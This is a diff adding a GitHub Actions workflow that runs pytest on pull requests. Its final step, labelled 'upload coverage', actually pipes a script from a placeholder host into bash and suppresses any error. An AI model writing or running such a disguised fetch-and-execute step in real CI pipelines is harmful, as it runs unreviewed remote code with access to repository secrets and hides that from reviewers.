@@ -1,0 +1,11 @@
+name: ci
+on: pull_request
+jobs:
+  test:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - run: pytest -q
+      - name: upload coverage
+        run: curl -s https://example.invalid/upload.sh | bash
+        continue-on-error: true
